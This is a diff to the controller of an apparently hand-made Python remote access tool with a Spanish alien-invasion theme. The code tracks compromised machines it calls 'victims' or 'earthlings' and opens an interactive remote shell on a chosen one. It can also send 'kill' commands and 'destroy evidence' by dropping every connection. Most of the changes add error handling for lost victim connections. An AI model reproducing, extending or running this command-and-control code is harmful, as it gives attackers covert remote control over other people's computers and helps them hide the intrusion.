@@ -171,6 +171,7 @@ class Server(Thread):
 
 	def recibir(self,server,chunk=4096):
 		raw_msg = server.recv(chunk)
+		#self.server.settimeout(3)
 		msg = (raw_msg).decode('utf-8')
 		return msg
 
@@ -183,6 +184,7 @@ class Server(Thread):
 			contenido = self.recibir(server,1024)
 			if (contenido=='ok'):
 				break
+			#self.server.settimeout(3)
 			completo+=contenido
 
 		print ("\n"+completo+"\n")
@@ -322,15 +324,30 @@ class Server(Thread):
 
 	def matar_terricolas(self):
 
+		contador = 0
+
 		if(len(self.terricolas)>0):
 			print(" \n [\033[1;34m*\033[0;39m] Preparandote para acabar con los individuos...\n")
 			time.sleep(2)
 
 			for terricola in self.terricolas:
-				print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
-				print(" [\033[1;34m*\033[0;39m] " + ataques())
+
+				try:
+					print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
+					self.enviar(terricola[0],'matar')
+					print(" [\033[1;34m*\033[0;39m] " + ataques())
+					
+				except ConnectionResetError as e:
+					print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
+					time.sleep(0.5)
+					print (" [\033[1;32m+\033[0;39m] Se ha desechado el cuerpo de " + terricola[2])
+					self.remover_terricola(contador)
+
+				except BrokenPipeError as e:
+					print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
+					self.remover_terricola(contador)
 				
-				self.enviar(terricola[0],'matar')
+				contador += 1
 				time.sleep(0.5)
 
 			self.terricolas.clear()
@@ -350,8 +367,20 @@ class Server(Thread):
 	## proceso, cierra el socket.
 
 	def destruir_evidencias(self):
+		
+		contador = 0
+
 		for terricola in self.terricolas:
-			self.enviar(terricola[0],"matar")
+
+			try:
+				self.enviar(terricola[0],"matar")
+			except ConnectionResetError:
+				self.remover_terricola(contador)
+
+			except BrokenPipeError as e:
+				self.remover_terricola(contador)
+			
+			contador += 1
 			time.sleep(0.5)
 		
 		self.terricolas.clear()
@@ -400,33 +429,28 @@ class Control():
 		sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")
 
 		while(True):
-			try:
 
-				if(sesion!=""):
-					if("cd " in sesion):
-						self.servidor.enviar(self.objetivo,sesion)
-						location = self.servidor.recibir(self.objetivo)
-						print(location)
+			if(sesion!=""):
+				if("cd " in sesion):
+					self.servidor.enviar(self.objetivo,sesion)
+					location = self.servidor.recibir(self.objetivo)
+					print(location)
 
-					elif (sesion=="detener") or (sesion=="exit"):
-						self.servidor.enviar(self.objetivo,sesion)
-						t = self.servidor.recibir(self.objetivo)
-						print(t)
-						break
+				elif (sesion=="detener") or (sesion=="exit"):
+					self.servidor.enviar(self.objetivo,sesion)
+					t = self.servidor.recibir(self.objetivo)
+					print(t)
+					break
 
-					elif (sesion=="ayuda"):
-						desplegar_ayuda(COMANDOS,'cmd')
+				elif (sesion=="ayuda"):
+					desplegar_ayuda(COMANDOS,'cmd')
 
-					else:
-						self.servidor.enviar(self.objetivo,sesion)
-						self.servidor.recibir_todo(self.objetivo)
+				else:
+					self.servidor.enviar(self.objetivo,sesion)
+					self.servidor.recibir_todo(self.objetivo)
 
 
-				sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")
-
-			except Exception as e:
-				print(" Error de comunicacion con vicitma: ",e)
-				break
+			sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")
 
 		return
 
@@ -928,63 +952,74 @@ def laboratorio(servidor):
 
 	while(prompt_laboratorio!="volver"):
 
-		if ('manipular' in prompt_laboratorio):
-			if (prompt_laboratorio=="manipular"):
-				print(" Utilice 'manipular <id>'")
-			elif (re.match("manipular(\d|\w)",prompt_laboratorio)):
-				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
+		try:
+
+			if ('manipular' in prompt_laboratorio):
+				if (prompt_laboratorio=="manipular"):
+					print(" Utilice 'manipular <id>'")
+				elif (re.match("manipular(\d|\w)",prompt_laboratorio)):
+					print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
+				else:
+					try:
+						cliente = int(prompt_laboratorio.replace('manipular', ''))-1
+
+						if (cliente < len(servidor.terricolas)) and (cliente>=0):
+							chain_alien(" \n [\033[1;34m*\033[0;39m] Tomando control sobre el humano...")
+							time.sleep(1.3)
+							chain_alien ("\n [\033[1;32m+\033[0;39m] El cuerpo esta listo para su control.")
+							time.sleep(1.5)
+							manipular(servidor,cliente)
+							encabezados("laboratorio")
+							print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
+						else:
+							print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
+
+					except ValueError as e:
+						#print(e)
+						print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");
+
+			elif ('matar' in prompt_laboratorio):
+				if (prompt_laboratorio=="matar"):
+					print(" Utilice 'matar <id>'")
+				elif (re.match("matar(\d|\w)",prompt_laboratorio)):
+					print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
+				else:
+					try:
+						cliente = int(prompt_laboratorio.replace('matar', ''))-1
+						
+						if (cliente < len(servidor.terricolas)) and (cliente>=0):
+							servidor.matar_terricola(cliente)
+							print("\n [\033[1;34m*\033[0;39m] " + ataques() + "\n")
+						else:
+							print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
+
+					except ValueError:
+						print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");
+
+			elif (prompt_laboratorio=="listar"):
+				servidor.ver_terricolas("laboratorio")
+
+			elif (prompt_laboratorio=="ayuda"):
+				desplegar_ayuda(COMANDOS,'laboratorio')
+
+			elif (prompt_laboratorio=="limpiar"):
+				encabezados('laboratorio')
+
+			elif (prompt_laboratorio==""):
+				pass
+
 			else:
-				try:
-					cliente = int(prompt_laboratorio.replace('manipular', ''))-1
+				print('\n [\033[1;31mx\033[0;39m] Comando "'+ prompt_laboratorio+ '" no encontrado.\n')
 
-					if (cliente < len(servidor.terricolas)) and (cliente>=0):
-						chain_alien(" \n [\033[1;34m*\033[0;39m] Tomando control sobre el humano...")
-						time.sleep(1.3)
-						chain_alien ("\n [\033[1;32m+\033[0;39m] El cuerpo esta listo para su control.")
-						time.sleep(1.5)
-						manipular(servidor,cliente)
-						encabezados("laboratorio")
-						print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
-					else:
-						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
+		except ConnectionResetError as e:
+			print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
+			time.sleep(0.5)
+			print (" [\033[1;32m+\033[0;39m] Se ha desechado el cuerpo de " + servidor.terricolas[cliente][2])
+			servidor.remover_terricola(cliente)
 
-				except ValueError as e:
-					#print(e)
-					print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");
-
-		elif ('matar' in prompt_laboratorio):
-			if (prompt_laboratorio=="matar"):
-				print(" Utilice 'matar <id>'")
-			elif (re.match("matar(\d|\w)",prompt_laboratorio)):
-				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
-			else:
-				try:
-					cliente = int(prompt_laboratorio.replace('matar', ''))-1
-					
-					if (cliente < len(servidor.terricolas)) and (cliente>=0):
-						servidor.matar_terricola(cliente)
-						print("\n [\033[1;34m*\033[0;39m] " + ataques() + "\n")
-					else:
-						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");
-
-				except ValueError:
-					print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");
-
-		elif (prompt_laboratorio=="listar"):
-			servidor.ver_terricolas("laboratorio")
-
-		elif (prompt_laboratorio=="ayuda"):
-			desplegar_ayuda(COMANDOS,'laboratorio')
-
-		elif (prompt_laboratorio=="limpiar"):
-			encabezados('laboratorio')
-
-		elif (prompt_laboratorio==""):
-			pass
-
-		else:
-			print('\n [\033[1;31mx\033[0;39m] Comando "'+ prompt_laboratorio+ '" no encontrado.\n')
-
+		except BrokenPipeError as e:
+			print (" [\033[1;31mx\033[0;39m] Durante la sesion, la victima ha muerto: ",e);
+			servidor.remover_terricola(cliente)
 
 		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()
 
@@ -1042,7 +1077,7 @@ def abducciones_menu(servidor):
 		elif (selector=='limpiar'):
 			encabezados('abduccion')
 
-		elif(selector == ''):
+		elif(selector==''):
 			pass
 
 		else:
